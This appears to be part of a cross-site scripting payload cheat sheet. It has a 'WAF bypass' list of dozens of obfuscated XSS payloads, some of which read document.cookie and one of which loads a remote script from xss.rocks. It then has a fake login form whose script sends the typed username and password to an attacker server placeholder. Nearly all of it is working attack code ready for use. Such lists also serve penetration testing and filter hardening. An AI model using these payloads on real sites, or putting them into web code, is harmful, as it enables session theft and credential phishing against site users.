### WAF bypass
```
<a href="javascript&colon;alert&lpar;document&period;cookie&rpar;">REDIRECT TO LOGIN</a>
<iframe/src="data:text/html,<svg onload=alert(1)>">
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<iMG onerror="top['loc\u{61}tion'] = 'javascript:alert\u{28})'" src />
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<img src='1' onerror='alert(0)' <
<img src=1 onerror="s=document.createElement('sCriPt');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);"
<iMG src &gt; onerror="alert&#x000000028;&#x29;" />
<iMG src onload=%ff%00%ffAAA onerror=alert() />
<img src="/" =_=" title="onerror='prompt(1)'">
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<iNpUt %253e onfocus="&#x000000000000000000000000000000061;lert()" autofocus />
<iNpUt /&#62; id=""onfocus="window['\a\l\ert']()" autofocus/>
<iNpUt &gt; id="x"onfocus="window['\a\l\ert']()" autofocus />
<iNpUt type=image src onerror="prompt(1)">
<iNpUt type=im&#x000000000000000000000000000000061;ge &gt; id="x"oNerRor="window['\a\l\ert']()" src />
<iNpUt x='&#39; /> ' id=""onfocus="window['\a\l\ert']()" autofocus/>
<iNpUt x="&quot; /> " id=""onfocus="window['\a\l\ert']()" autofocus/>
<iNpUt x="&#x22; /> " id=""onfocus="window['\a\l\ert']()" autofocus/> 
<oBjECt data="javascript:window['\a\l\ert']()" />
<sCriPt>$=1,alert($)</sCriPt>
<sCriPt>$=1,\u0061lert($)</sCriPt>
<sCriPt>alert``</sCriPt>
<sCriPt ~~~>confirm(1)</sCriPt ~~~>
<sCriPt>eval('alert\x280\x29');</sCriPt>
<sCriPt>Function('alert\x280\x29')();</sCriPt>
<</sCriPt/sCriPt><sCriPt>eval('\\u'+'0061'+'lert(1)')//</sCriPt>
<</sCriPt/sCriPt><sCriPt ~~~>\u0061lert(1)</sCriPt ~~~>
<sCriPt>setTimeout('alert\x280\x29',0);</sCriPt>
<sCriPt>window.location='javascript:alert(0)';</sCriPt>
<sCriPt x> alert(1) </sCriPt 1=2
<sCriPt x>alert('XSS')<sCriPt y>
<sCriPt>𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()</sCriPt>
<sCriPt>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ア+=ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ア](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</sCriPt>
</style></sCriPt><sCriPt>alert(1)</sCriPt>
<svg><animate onbegin=alert() attributeName=x></svg>
<svg id=`x`onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg onload=alert(1)//
<svg////////onload=alert(1)>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg><x><sCriPt>alert('1'&#41</x>
&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
```

### Fake authentication form sending credentials to remote server

    <input type="text" name="username" id="username" /><input type="password" name="password" id="password" /><script>function sleep(ms){return new Promise(r => setTimeout(r,ms));}sleep(3000).then(()=> {var user =document.getElementById('username').value;var pass = document.getElementById('password').value;var user_pass = user+"_"+pass;fetch("https://[YOUR_SERVER]?u="+user_pass);});</script>
